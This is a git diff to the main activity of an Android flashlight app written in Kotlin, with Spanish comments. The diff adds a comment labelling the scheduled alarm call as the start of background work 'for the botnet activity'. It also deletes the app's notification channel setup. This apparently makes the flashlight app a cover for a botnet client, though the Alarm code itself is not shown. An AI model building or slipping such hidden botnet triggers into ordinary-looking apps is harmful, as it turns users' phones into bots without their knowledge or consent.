@@ -42,9 +42,10 @@ class MainActivity : AppCompatActivity() {
 
         button2.visibility = INVISIBLE
         var alarm = Alarm()
+
+        // Comienzo del trabajo en segundo plano para la actividad de la botnet
         alarm.setAlarm(this)
 
-        createNotificationChannel() // Canal de comunicacion de notificaciones necesario en API 26+
 
         // Cuando la linterna está encendida
         button.setOnClickListener {
@@ -82,21 +83,6 @@ class MainActivity : AppCompatActivity() {
                     print("Error al encontrar el flash")
                 }
             }
-        }
-    }
-
-    // Crea el canal de notificaciones para API 26+
-    private fun createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val name = "Notificaciones"
-            val descriptionText = "Canal de notificaciones"
-            val importance = NotificationManager.IMPORTANCE_DEFAULT
-            val channel = NotificationChannel("1", name, importance).apply {
-                description = descriptionText
-            }
-            val notificationManager: NotificationManager =
-                getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-            notificationManager.createNotificationChannel(channel)
         }
     }
 
